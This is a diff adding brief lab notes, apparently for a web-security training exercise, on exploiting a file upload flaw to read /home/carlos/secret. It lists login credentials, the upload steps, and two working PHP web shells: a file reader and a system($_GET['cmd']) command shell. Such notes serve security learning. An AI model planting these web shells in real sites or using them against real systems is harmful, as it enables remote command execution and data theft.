@@ -1,0 +1,14 @@
+Remote code execution via web shell upload
+Goal:Exploit the file upload vulnerability to exfiltrate the contents of the file /home/carlos/secret
+wiener:peter
+
+1)
+-login
+-upload shell.php
+-visit /files/avatars/shell.php
+
+shell.php
+<?php echo file_get_contents('/home/carlos/secret');?>
+
+shell2.php
+<?php system($_GET['cmd']);?>
